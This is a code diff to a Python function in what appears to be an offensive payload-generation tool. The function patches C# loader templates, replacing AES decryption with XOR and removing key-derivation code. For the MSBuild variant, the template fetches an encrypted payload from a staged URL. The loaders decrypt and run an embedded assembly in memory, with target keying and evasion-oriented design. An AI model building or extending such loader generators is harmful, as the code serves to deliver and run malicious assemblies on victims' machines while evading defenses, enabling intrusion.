@@ -125,29 +125,30 @@ def _csharp_xor_method(indent: int) -> str:
     )
 
 
-def patch_csharp_for_xor(template: str, indent: int = 8, is_msbuild: bool = False) -> str:
+def patch_csharp_for_xor(template: str, indent: int = 8, is_msbuild: bool = False,
+                         body_indent: int = None) -> str:
     template = template.replace(
         _csharp_aes_method(indent), _csharp_xor_method(indent)
     )
 
     sp = " " * indent
-    sp2 = " " * (indent + 4)
+    sp2 = " " * (body_indent if body_indent is not None else indent + 4)
 
     template = template.replace(f'{sp}static string IV_B64 = "YOURIVHERE";\n', "")
     template = template.replace(f'{sp}static string KEYING = "YOURKEYINGHERE";\n', "")
     template = template.replace(f'{sp}static string SALT_B64 = "YOURSALTHERE";\n', "")
 
-    # Remove DeriveKey method
-    derive_start = f"{sp}static byte[] DeriveKey(string saltB64, string keying)\n{sp}{{"
     if is_msbuild:
-        derive_end = f"{sp}}}\n\n{sp}static byte[] FetchPayload"
-    else:
-        derive_end = f"{sp}}}\n\n{sp}static string ENCRYPTED_B64"
+        template = template.replace(f'{sp}static string STAGED_URL = "YOURSTAGEDURL";\n', "")
+
+    # Remove DeriveKey method (and FetchPayload for msbuild since staged+xor is blocked)
+    derive_start = f"{sp}static byte[] DeriveKey(string saltB64, string keying)\n{sp}{{"
+    derive_end = f"{sp}}}\n\n{sp}static string ENCRYPTED_B64"
 
     if derive_start in template:
         idx_start = template.index(derive_start)
         idx_end = template.index(derive_end)
-        after_marker = f"{sp}static byte[] FetchPayload" if is_msbuild else f"{sp}static string ENCRYPTED_B64"
+        after_marker = f"{sp}static string ENCRYPTED_B64"
         template = template[:idx_start] + after_marker + template[idx_end + len(derive_end) :]
 
     if not is_msbuild:
@@ -155,31 +156,62 @@ def patch_csharp_for_xor(template: str, indent: int = 8, is_msbuild: bool = Fals
         template = template.replace("using System.Text;\n", "")
 
     # Simplify decryption call — replace AES keying/decrypt block with XOR
-    aes_call = (
-        f"{sp2}byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);\n"
-        f"\n"
-        f"{sp2}byte[] key;\n"
-        f"{sp2}if (KEYING.Length > 0)\n"
-        f"{sp2}    key = DeriveKey(SALT_B64, KEYING);\n"
-        f"{sp2}else\n"
-        f"{sp2}    key = Convert.FromBase64String(KEY_B64);\n"
-        f"{sp2}byte[] iv = Convert.FromBase64String(IV_B64);\n"
-        f"\n"
-        f"{sp2}byte[] clearAssembly;\n"
-        f"{sp2}try\n"
-        f"{sp2}{{\n"
-        f"{sp2}    clearAssembly = AesDecrypt(encrypted, key, iv);\n"
-        f"{sp2}}}\n"
-        f"{sp2}catch (CryptographicException)\n"
-        f"{sp2}{{\n"
-        f'{sp2}    Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");\n'
-        f"{sp2}    return{' true' if is_msbuild else ''};\n"
-        f"{sp2}}}\n"
-        f"\n"
-        f"{sp2}Array.Clear(encrypted, 0, encrypted.Length);\n"
-        f"{sp2}Array.Clear(key, 0, key.Length);\n"
-        f"{sp2}Array.Clear(iv, 0, iv.Length);"
-    )
+    if is_msbuild:
+        aes_call = (
+            f"{sp2}byte[] encrypted;\n"
+            f"{sp2}if (STAGED_URL.Length > 0)\n"
+            f"{sp2}    encrypted = FetchPayload(STAGED_URL);\n"
+            f"{sp2}else\n"
+            f"{sp2}    encrypted = Convert.FromBase64String(ENCRYPTED_B64);\n"
+            f"\n"
+            f"{sp2}byte[] key;\n"
+            f"{sp2}if (KEYING.Length > 0)\n"
+            f"{sp2}    key = DeriveKey(SALT_B64, KEYING);\n"
+            f"{sp2}else\n"
+            f"{sp2}    key = Convert.FromBase64String(KEY_B64);\n"
+            f"{sp2}byte[] iv = Convert.FromBase64String(IV_B64);\n"
+            f"\n"
+            f"{sp2}byte[] clearAssembly;\n"
+            f"{sp2}try\n"
+            f"{sp2}{{\n"
+            f"{sp2}    clearAssembly = AesDecrypt(encrypted, key, iv);\n"
+            f"{sp2}}}\n"
+            f"{sp2}catch (CryptographicException)\n"
+            f"{sp2}{{\n"
+            f'{sp2}    Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");\n'
+            f"{sp2}    return true;\n"
+            f"{sp2}}}\n"
+            f"\n"
+            f"{sp2}Array.Clear(encrypted, 0, encrypted.Length);\n"
+            f"{sp2}Array.Clear(key, 0, key.Length);\n"
+            f"{sp2}Array.Clear(iv, 0, iv.Length);"
+        )
+    else:
+        aes_call = (
+            f"{sp2}byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);\n"
+            f"\n"
+            f"{sp2}byte[] key;\n"
+            f"{sp2}if (KEYING.Length > 0)\n"
+            f"{sp2}    key = DeriveKey(SALT_B64, KEYING);\n"
+            f"{sp2}else\n"
+            f"{sp2}    key = Convert.FromBase64String(KEY_B64);\n"
+            f"{sp2}byte[] iv = Convert.FromBase64String(IV_B64);\n"
+            f"\n"
+            f"{sp2}byte[] clearAssembly;\n"
+            f"{sp2}try\n"
+            f"{sp2}{{\n"
+            f"{sp2}    clearAssembly = AesDecrypt(encrypted, key, iv);\n"
+            f"{sp2}}}\n"
+            f"{sp2}catch (CryptographicException)\n"
+            f"{sp2}{{\n"
+            f'{sp2}    Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");\n'
+            f"{sp2}    return;\n"
+            f"{sp2}}}\n"
+            f"\n"
+            f"{sp2}Array.Clear(encrypted, 0, encrypted.Length);\n"
+            f"{sp2}Array.Clear(key, 0, key.Length);\n"
+            f"{sp2}Array.Clear(iv, 0, iv.Length);"
+        )
 
     xor_call = (
         f"{sp2}byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);\n"
